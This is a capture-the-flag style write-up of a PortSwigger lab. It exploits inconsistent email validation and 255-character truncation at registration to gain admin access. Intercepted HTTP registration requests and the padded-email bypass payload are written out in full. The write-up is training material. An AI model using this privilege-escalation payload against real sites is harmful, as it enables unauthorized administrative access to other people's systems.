# [Lab 4: Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)

---

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete Carlos.

---

## Solution

Navigate to the registration page. A banner indicates that employees should use their `@dontwannacry.com` email address.

![](images/Pasted%20image%2020210826161007.png)

Register an account with an email address of that domain and intercept the request.

```http
POST /register HTTP/1.1
Host: ace51f401f1f375d80c20e0200f600a4.web-security-academy.net
Cookie: session=i56Tk2XKwQOcgJIjdGjgK2PjVDvlKcQX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: https://ace51f401f1f375d80c20e0200f600a4.web-security-academy.net
Referer: https://ace51f401f1f375d80c20e0200f600a4.web-security-academy.net/register
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

csrf=2Syvqg2wU8bw2Tm0HWt2zFxffuBucGlz&username=tgihf&email=tgihf%40dontwannacry.com&password=blah
```

The response from the application indicates that an account registration link was sent to the specified email address (`tgihf@dontwannacry.com`), which is inaccessible.

It seems that to access the administrative panel, one needs to register an account with the `@dontwannacry.com` email address. The challenge's exploit server gives access to all emails sent to domain `exploit-ac4a1f8c1ffd37c280b20e5701bf000f.web-security-academy.net` and any subdomains of that domain. Perhaps the application only ensures the string `dontwannacry.com` is in the email address. If this is the case, then it may be possible to bypass this restriction by regstering an account with `dontwannacry.com` as the subdomain of `exploit-ac4a1f8c1ffd37c280b20e5701bf000f.web-security-academy.net`. Attempt to register an account with this email address.

```http
POST /register HTTP/1.1
Host: ace51f401f1f375d80c20e0200f600a4.web-security-academy.net
Cookie: session=i56Tk2XKwQOcgJIjdGjgK2PjVDvlKcQX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: https://ace51f401f1f375d80c20e0200f600a4.web-security-academy.net
Referer: https://ace51f401f1f375d80c20e0200f600a4.web-security-academy.net/register
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

csrf=2Syvqg2wU8bw2Tm0HWt2zFxffuBucGlz&username=tgihf&email=tgihf%40dontwannacry.com.exploit-ac4a1f8c1ffd37c280b20e5701bf000f.web-security-academy.net&password=blah
```

This request successfully causes the web application to send an email confirmation link to the email server given by the challenge.

![](images/Pasted%20image%2020210826163519.png)

Follow the link to finish registering the account. Login with the account. Unfortunately, the account doesn't have administrative access.

It seems that the application only allows administrative access to users whose email addresses are of the `dontwannacry` domain. How does the application go about ensuring that the email of the user is a part of this domain? Perhaps it just compares the last 12 characters to the email address to `dontwannacry` and if they are equal, allows the user to have administrative access.

After some trial and error, it becomes clear that the application stores the user-input email address into a limited-size buffer such that if the buffer is overflowed, the application only saves the first N characters as the email address. The buffer size appears to be 255 characters. Thus, by inputting the email address `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadontwannacry.com@exploit-ac4a1f8c1ffd37c280b20e5701bf000f.web-security-academy.net`, the application sends the account registration email to the attacker-controlled email address and saves the email address as `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadontwannacry.com`. Logging in with this account grants administrative access. Delete `carlos`'s account to complete the challenge.
